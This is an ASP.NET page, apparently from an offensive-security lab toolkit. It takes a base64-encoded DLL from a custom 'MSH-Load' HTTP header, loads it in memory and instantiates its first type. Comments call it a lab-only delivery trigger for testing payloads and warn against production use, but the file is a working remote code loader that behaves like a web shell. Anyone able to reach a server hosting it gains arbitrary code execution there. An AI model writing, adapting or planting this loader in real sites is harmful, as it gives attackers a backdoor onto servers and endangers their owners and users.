<%@ Page Language="C#" %>
<%@ Import Namespace="System" %>
<%@ Import Namespace="System.Reflection" %>
<%
    // ---------------------------------------------------------------------------
    // LAB-ONLY delivery trigger. Exists so the payloads can be exercised against a local
    // test site WITHOUT a deserialization vector. It loads a payload DLL (base64 in the
    // MSH-Load request header, produced by tools/build.ps1) and instantiates its entry type.
    // NEVER deploy this file to a production site - it is a loader by design.
    // ---------------------------------------------------------------------------
    Response.ContentType = "text/plain";
    try
    {
        string b64 = Request.Headers["MSH-Load"];
        if (string.IsNullOrEmpty(b64)) { Response.Write("missing MSH-Load header"); return; }
        byte[] dll = Convert.FromBase64String(b64);
        Assembly asm = Assembly.Load(dll);
        object o = Activator.CreateInstance(asm.GetTypes()[0]);
        Response.Write("loaded+instantiated: " + asm.GetTypes()[0].FullName);
    }
    catch (Exception ex)
    {
        Response.Write("ERR: " + ex.Message);
    }
%>
